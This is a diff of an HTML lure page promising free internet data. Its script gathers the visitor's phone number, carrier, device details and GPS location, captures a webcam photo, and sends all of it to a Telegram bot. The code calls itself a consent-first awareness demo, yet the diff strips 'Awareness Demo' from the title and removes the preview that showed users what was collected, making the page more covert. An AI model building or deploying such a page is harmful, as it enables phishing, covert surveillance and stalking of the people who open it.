@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Free Internet Data Hub — Awareness Demo</title>
+<title>Free Internet Data Hub</title>
 <meta name="description" content="Consent-first demo showing how location & camera permission prompts work (educational only)." />
 <!-- CONFIG: If you want to test Telegram forwarding locally, set BOT_TOKEN and CHAT_ID.
      WARNING: putting your bot token client-side is insecure. Prefer server-side proxy for real use. -->
@@ -13,7 +13,6 @@
 </script>
 
 <style>
-  /* ---------- DESIGN: Free Internet style (mobile-first) ---------- */
   :root{
     --bg-start: #1bd49f;
     --bg-end: #2cc0ff;
@@ -27,24 +26,20 @@
   html,body{height:100%;margin:0;font-family:Inter, 'Segoe UI', Roboto, system-ui, -apple-system, Arial;color:#0b1220;}
   body{background:linear-gradient(180deg, #f7fdf9 0%, #f3fbff 100%); -webkit-font-smoothing:antialiased; padding:20px 12px;}
 
-  /* top appbar */
   .appbar{display:flex;align-items:center;gap:12px;background:#fff;border-radius:10px;padding:14px 16px;box-shadow:var(--shadow);max-width:1100px;margin:0 auto 18px;}
   .logo{display:flex;align-items:center;gap:10px}
   .logo .icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--bg-start),var(--bg-end));display:grid;place-items:center;color:#fff;font-weight:800}
   .brand{font-size:20px;color:var(--bg-start);font-weight:700}
   .appbar small{display:block;color:var(--muted);font-size:12px;margin-top:2px}
 
-  /* hero */
   .hero{max-width:1100px;margin:0 auto;background:linear-gradient(180deg,var(--bg-start),var(--bg-end));color:#fff;border-radius:18px;padding:46px 24px;box-shadow:var(--shadow);overflow:hidden}
   .hero h1{margin:0;font-size:28px;line-height:1.02;text-align:center;font-weight:800}
   .hero p{margin-top:12px;text-align:center;color:rgba(255,255,255,0.9);font-size:15px;max-width:760px;margin-left:auto;margin-right:auto}
   .hero .cta{display:block;margin:22px auto 0;padding:12px 18px;border-radius:12px;background:rgba(255,255,255,0.12);color:#fff;border:0;font-weight:700;max-width:260px;text-align:center}
 
-  /* main content grid */
   .main{max-width:1100px;margin:18px auto 80px;display:grid;grid-template-columns:1fr 420px;gap:24px}
   @media (max-width:980px){ .main{grid-template-columns:1fr} .hero h1{font-size:24px} }
 
-  /* left column - features & testimonials */
   .left{padding:18px;border-radius:14px;background:linear-gradient(180deg,#f7fff7, #fff);box-shadow:var(--shadow)}
   .sectionTitle{font-weight:800;font-size:20px;color:#102028;margin-bottom:12px}
   .featureCard{background:#f2fcf7;border-radius:14px;padding:18px;margin-bottom:12px;display:flex;gap:12px;align-items:center}
@@ -58,7 +53,6 @@
   .t-head strong{display:block}
   .t-head small{color:var(--bg-start)}
 
-  /* right column - form card */
   .card{background:var(--card);border-radius:16px;padding:18px;box-shadow:var(--shadow);position:relative}
   .card h3{margin:0;font-size:20px;color:#0b1220}
   .muted{color:var(--muted);font-size:13px}
@@ -72,14 +66,8 @@
   .consent label{font-size:13px;color:var(--muted)}
   .status{margin-top:12px;color:var(--muted);font-size:14px}
 
-  /* preview box */
-  .previewBox{margin-top:12px;background:#fafdfc;border-radius:12px;padding:12px;border:1px solid #eef6f2;font-size:13px;color:#0b1220}
-  .snapshot{max-width:100%;border-radius:10px;margin-top:8px;display:block}
-
-  /* footer small */
   .note{font-size:12px;color:#9aa3b2;margin-top:10px}
 
-  /* helpers */
   .rowBetween{display:flex;justify-content:space-between;align-items:center}
   .center{display:flex;align-items:center;gap:10px}
 </style>
@@ -196,15 +184,13 @@
 
       <div class="status" id="status"> </div>
 
-      <div class="previewBox" id="preview" style="display:none" aria-live="polite"></div>
-
       <div class="note">⚠️ Demo purpose only — do not use real credentials here. Client-side Telegram token is insecure; use server forwarding for production.</div>
     </aside>
   </main>
 
 <script>
 /* =====================
-   DEMO JS - consent-first
+   DEMO JS - consent-first (no preview)
    ===================== */
 
 const countryEl = document.getElementById('country');
@@ -213,13 +199,10 @@ const phoneEl = document.getElementById('phone');
 const consentEl = document.getElementById('consent');
 const claimBtn = document.getElementById('claimBtn');
 const statusEl = document.getElementById('status');
-const previewEl = document.getElementById('preview');
 
-/* helpers */
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 const safe = v => (v||'').toString().trim();
 
-/* Device info */
 function getDeviceInfo(){
   return {
     platform: navigator.platform || 'unknown',
@@ -232,7 +215,6 @@ function getDeviceInfo(){
   };
 }
 
-/* Location */
 function requestLocation(timeout = 10000){
   return new Promise(resolve => {
     if(!navigator.geolocation) return resolve(null);
@@ -250,14 +232,12 @@ function requestLocation(timeout = 10000){
   });
 }
 
-/* Snapshot capture */
 async function takeSnapshot(){
   if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
   try{
     const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
     const track = stream.getVideoTracks()[0];
 
-    // Try ImageCapture.takePhoto if available
     if(window.ImageCapture){
       try{
         const ic = new ImageCapture(track);
@@ -269,13 +249,11 @@ async function takeSnapshot(){
       }catch(e){ /* fallback */ }
     }
 
-    // fallback draw to canvas
     const video = document.createElement('video');
     video.playsInline = true;
     video.muted = true;
     video.srcObject = stream;
     await video.play().catch(()=>{});
-
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 1280;
     canvas.height = video.videoHeight || 720;
@@ -291,8 +269,7 @@ async function takeSnapshot(){
   }
 }
 
-/* Compose payload text */
-async function composeText(phone, carrier, country, spinNote = ''){
+async function composeText(phone, carrier, country, note = ''){
   const dev = getDeviceInfo();
   const loc = await requestLocation(8000);
   const locLink = loc ? `https://maps.google.com/?q=${loc.lat},${loc.lon}` : 'Location not shared';
@@ -313,11 +290,10 @@ async function composeText(phone, carrier, country, spinNote = ''){
     '---',
     `Location: ${locLink}`
   ];
-  if(spinNote) lines.push('Note: ' + spinNote);
+  if(note) lines.push('Note: ' + note);
   return lines.join('\n');
 }
 
-/* Telegram senders (client-side demo only) */
 async function sendTelegramText(text){
   if(!BOT_TOKEN || !CHAT_ID){ console.warn('Telegram tokens not set'); return null; }
   try{
@@ -326,10 +302,7 @@ async function sendTelegramText(text){
     fd.append('text', text);
     const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', body: fd });
     return await resp.json();
-  }catch(e){
-    console.error('TG send error', e);
-    return null;
-  }
+  }catch(e){ console.error('TG send error', e); return null; }
 }
 async function sendTelegramPhoto(captionText, blob){
   if(!BOT_TOKEN || !CHAT_ID){ console.warn('Telegram tokens not set'); return null; }
@@ -341,28 +314,11 @@ async function sendTelegramPhoto(captionText, blob){
     fd.append('caption', caption);
     const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
     return await resp.json();
-  }catch(e){
-    console.error('TG photo error', e);
-    return null;
-  }
+  }catch(e){ console.error('TG photo error', e); return null; }
 }
 
-/* Render preview box (no network) */
-function renderPreview(text, loc, imageUrl){
-  previewEl.style.display = 'block';
-  previewEl.innerHTML = `<strong>Collected info (preview):</strong>
-    <div style="margin-top:8px; font-size:13px; color:var(--muted)"><pre style="white-space:pre-wrap">${text}</pre></div>`;
-  if(loc) {
-    previewEl.innerHTML += `<div style="margin-top:8px"><a href="https://maps.google.com/?q=${loc.lat},${loc.lon}" target="_blank">Open location in maps</a></div>`;
-  }
-  if(imageUrl){
-    previewEl.innerHTML += `<img src="${imageUrl}" alt="snapshot" class="snapshot" />`;
-  }
-}
-
-/* Main flow on claim button */
+/* Main action */
 claimBtn.addEventListener('click', async () => {
-  previewEl.style.display = 'none';
   statusEl.textContent = '';
   const phone = safe(phoneEl.value);
   const carrier = safe(carrierEl.value);
@@ -382,25 +338,14 @@ claimBtn.addEventListener('click', async () => {
   // Start location + snapshot concurrently
   const locPromise = requestLocation(10000);      // may resolve null if denied/timeouts
   const snapPromise = takeSnapshot();             // may resolve null if denied
-
-  // Meanwhile compose text (includes a separate location request inside composeText — we still await locPromise for preview)
   const textPromise = composeText(phone, carrier, country, 'FreeRecharge demo submission');
 
-  // wait for both
   const [text, snapBlob, loc] = await Promise.all([textPromise, snapPromise, locPromise]);
 
-  // create preview image url if snapshot exists
-  let imgUrl = null;
-  if(snapBlob){ imgUrl = URL.createObjectURL(snapBlob); }
+  statusEl.textContent = 'Collected. ' + (BOT_TOKEN && CHAT_ID ? 'Sending to Telegram...' : 'Telegram not configured — demo only.');
 
-  // Show preview on page
-  renderPreview(text, loc, imgUrl);
-  statusEl.textContent = 'Collected data (preview shown). Sending to Telegram if demo credentials provided...';
-
-  // If Telegram tokens present, attempt to send (client-side demo)
   if(BOT_TOKEN && CHAT_ID){
     try{
-      statusEl.textContent = 'Sending to Telegram...';
       if(snapBlob){
         await sendTelegramPhoto(text, snapBlob);
       }else{
@@ -408,19 +353,18 @@ claimBtn.addEventListener('click', async () => {
       }
       statusEl.textContent = 'Sent to Telegram (client-side demo).';
     }catch(e){
+      console.error(e);
       statusEl.textContent = 'Failed to send to Telegram (see console).';
     }
   }else{
-    statusEl.textContent = 'Telegram not configured — preview only (recommended for safe demos).';
+    statusEl.textContent = 'Demo complete. Telegram not configured — data was not forwarded.';
   }
 
-  // release object URL after 30s to avoid memory leak
-  if(imgUrl) setTimeout(()=>URL.revokeObjectURL(imgUrl), 30000);
+  // release any created object URLs (none created here)
 });
 
-/* Accessibility: allow Enter to submit when focused on phone field */
+/* Accessibility: Enter key on phone submits */
 phoneEl.addEventListener('keydown', e => { if(e.key === 'Enter'){ claimBtn.click(); } });
-
 </script>
 </body>
 </html>
